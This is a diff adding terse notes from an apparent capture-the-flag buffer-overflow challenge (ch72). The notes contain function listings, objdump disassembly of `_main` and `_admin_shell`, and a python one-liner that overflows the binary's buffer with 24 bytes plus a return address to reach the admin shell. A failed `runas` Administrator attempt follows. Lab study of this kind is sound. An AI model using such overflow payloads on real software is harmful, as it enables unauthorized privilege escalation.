@@ -1,0 +1,80 @@
+0x004015a4   21     1     0     1   17 0x004015a4    21 0x004015b9     1    0      1    1     8 fcn.004015a4
+0x00401926   21     1     0     1   14 0x00401926    21 0x0040193b     0    1      0   33     0 fcn.00401926
+0x004042d8   21     1     0     1   15 0x004042d8    21 0x004042ed     1    0      1    1     8 fcn.004042d8
+0x004079c4   21     1     0     1    8 0x004079c4    21 0x004079d9     0    0      0    1     0 fcn.004079c4
+
+
+0x004015a4   21     1     0     1   17 0x004015a4    21 0x004015b9     1    0      1    1     8 fcn.004015a4
+0x00401ae2  268     3     2     3    8 0x00401ae2    17 0x00401af3     0    1      2   29   816 fcn.00401ae2
+0x004020b7   23     1     0     1   17 0x004020b7    23 0x004020ce     1    0      2    2    16 fcn.004020b7
+0x00403ef8   26     1     0     1   17 0x00403ef8    26 0x00403f12     1    0      2    3    16 fcn.00403ef8
+0x00403f12   26     1     0     1   17 0x00403f12    26 0x00403f2c     1    0      2    1    16 fcn.00403f12
+0x00404663   20     1     0     1   17 0x00404663    20 0x00404677     2    0      0    1     4 loc.00404663
+0x004063c9   27     3     3     2   17 0x004063c9    27 0x004063e4     0    0      3    1     4 fcn.004063c9
+0x00407837  317    35    53    20  217 0x00407837   317 0x00407974     8    2      9    1    76 fcn.00407837
+0x00409c2c   24     1     0     1   17 0x00409c2c    24 0x00409c44     1    0      1    2    20 fcn.00409c2c
+0x0040b195  224    36    54    20  117 0x0040b195   224 0x0040b275     0    3      0    1    20 fcn.0040b195
+0x0040ef80   23     1     0     1   17 0x0040ef80    23 0x0040ef97     1    0      2    1    16 fcn.0040ef80
+0x00411e00   22     1     0     1   17 0x00411e00    22 0x00411e16     0    0      0    3    12 fcn.00411e00
+
+
+// main() @ 0x20
+// _admin_shell() @ 0x00
+
+0x20 - 0x00 = 32 bytes difference
+
+main()  = 0x00401020
+admin() = 0x00401000
+
+
+Shell Success w/ no privs, error:
+
+
+app-systeme-ch72@challenge05:~$ (python -c 'print "A" * 24 + "\x00\x10\x40\x00"';cat) | ./ch72.exe
+AAAAAAAAAAAAAAAA
+
+C:\cygwin64\challenge\app-systeme\ch72>runas /savecred /profile /user:Administrator whoami
+Attempting to start whoami as user "CHALLENGE05\Administrator" ...
+Enter the password for Administrator:
+Attempting to start whoami as user "CHALLENGE05\Administrator" ...
+RUNAS ERROR: Unable to run - whoami
+1326: The user name or password is incorrect.
+
+
+
+
+app-systeme-ch72@challenge05:~$ objdump.exe -D -M intel ./ch72.obj | grep main
+  1a:   77 69                   ja     85 <_main+0x65>
+  2b:   70 70                   jo     9d <_main+0x7d>
+  66:   74 20                   je     88 <_main+0x68>
+  6e:   74 69                   je     d9 <_main+0xb9>
+  7a:   70 69                   jo     e5 <_main+0xc5>
+  7d:   65 72 00                gs jb  80 <_main+0x60>
+   8:   77 73                   ja     7d <_main+0x5d>
+   b:   73 79                   jae    86 <_main+0x66>
+   d:   73 74                   jae    83 <_main+0x63>
+  17:   2e 65 78 65             cs gs js 80 <_main+0x60>
+  1d:   73 0a                   jae    29 <_main+0x9>
+00000020 <_main>:
+  40:   e8 00 00 00 00          call   45 <_main+0x25>
+  4f:   eb 09                   jmp    5a <_main+0x3a>
+  5e:   7d 1a                   jge    7a <_main+0x5a>
+  69:   e8 00 00 00 00          call   6e <_main+0x4e>
+  78:   eb d7                   jmp    51 <_main+0x31>
+  83:   e8 00 00 00 00          call   88 <_main+0x68>
+app-systeme-ch72@challenge05:~$ objdump.exe -D -M intel ./ch72.obj | grep -C 5 admin
+  1d:   73 0a                   jae    29 <_main+0x9>
+        ...
+
+Disassembly of section .text$mn:
+
+00000000 <_admin_shell>:
+   0:   55                      push   ebp
+   1:   8b ec                   mov    ebp,esp
+   3:   68 00 00 00 00          push   0x0
+   8:   e8 00 00 00 00          call   d <_admin_shell+0xd>
+   d:   83 c4 04                add    esp,0x4
+  10:   5d                      pop    ebp
+  11:   c3                      ret
+  12:   cc                      int3
+  13:   cc                      int3
